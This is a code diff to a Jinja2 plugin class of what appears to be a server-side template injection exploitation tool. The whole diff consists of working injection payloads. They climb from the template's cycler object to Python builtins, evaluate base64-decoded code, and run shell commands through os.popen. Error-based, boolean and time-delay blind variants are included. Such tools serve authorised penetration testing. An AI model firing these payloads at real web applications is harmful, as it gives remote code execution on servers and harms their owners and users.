@@ -27,17 +27,34 @@ class Jinja2(python.Python):
                 'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e}}}}',
                 'test_render_expected': f'{(rand.randints[0],rand.randints[1]*rand.randints[2])}'
             },
+            'render_error': {
+                'render': '{code}',
+                'header': '{{{{ cycler.__init__.__globals__.__builtins__.getattr("", (({header[0]}+{header[1]})|string)+(',
+                'trailer': '|string)+(({trailer[0]}+{trailer[1]})|string))}}}}',
+                'test_render': f'({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e',
+                'test_render_expected': f'{(rand.randints[0], rand.randints[1] * rand.randints[2])}'
+            },
             'evaluate': {
                 'call': 'render',
                 'evaluate': """{{{{cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode())}}}}"""
             },
+            'evaluate_error': {
+                'evaluate': """cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).rstrip()"""
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """{{{{1 / (not not cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__('base64').urlsafe_b64decode('{code_b64}').decode()))}}}}"""
+            },
             'execute': {
                 'call': 'render',
-                'execute': """{{{{cycler.__init__.__globals__.os.popen('$(echo "{code_b64p}"|base64 -d)').read()}}}}"""
+                'execute': """{{{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read()}}}}"""
+            },
+            'execute_error': {
+                'execute': """cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read().rstrip()"""
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{{{cycler.__init__.__globals__.os.popen('$(echo "{code_b64p}"| base64 -d) && sleep {delay}')}}}}"""
+                'execute_blind': """{{{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode() + ' && sleep {delay}')}}}}"""
             },
         })
 
